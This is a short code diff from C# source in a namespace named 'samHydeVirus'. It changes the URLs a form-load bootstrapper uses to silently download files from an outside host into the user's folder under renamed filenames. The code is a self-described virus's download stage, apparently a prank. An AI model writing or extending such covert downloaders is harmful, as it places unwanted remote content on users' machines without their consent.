@@ -26,7 +26,7 @@ namespace samHydeVirus
         private void Bootstrapper_Load(object sender, EventArgs e)
         {
             WebClient wc = new WebClient();
-            wc.DownloadFileAsync(new System.Uri("http://ifarded.lol/sam.jpg"), @"C:\Users\"+ Environment.UserName+@"\00001.mp3");
+            wc.DownloadFileAsync(new System.Uri("http://ifarded.lol/shv/sam.jpg"), @"C:\Users\"+ Environment.UserName+@"\00001.mp3");
             
             wc.DownloadProgressChanged += Wc_DownloadProgressChanged;
             wc.DownloadFileCompleted += Wc_DownloadFileCompleted;
@@ -35,7 +35,7 @@ namespace samHydeVirus
         private void Wc_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
         {
             WebClient ac = new WebClient();
-            ac.DownloadFileAsync(new System.Uri("http://ifarded.lol/sam.ico"), @"C:\Users\" + Environment.UserName + @"\00002.ico");
+            ac.DownloadFileAsync(new System.Uri("http://ifarded.lol/shv/sam.ico"), @"C:\Users\" + Environment.UserName + @"\00002.ico");
 
             ac.DownloadProgressChanged += Ac_DownloadProgressChanged;
             ac.DownloadFileCompleted += Ac_DownloadFileCompleted;
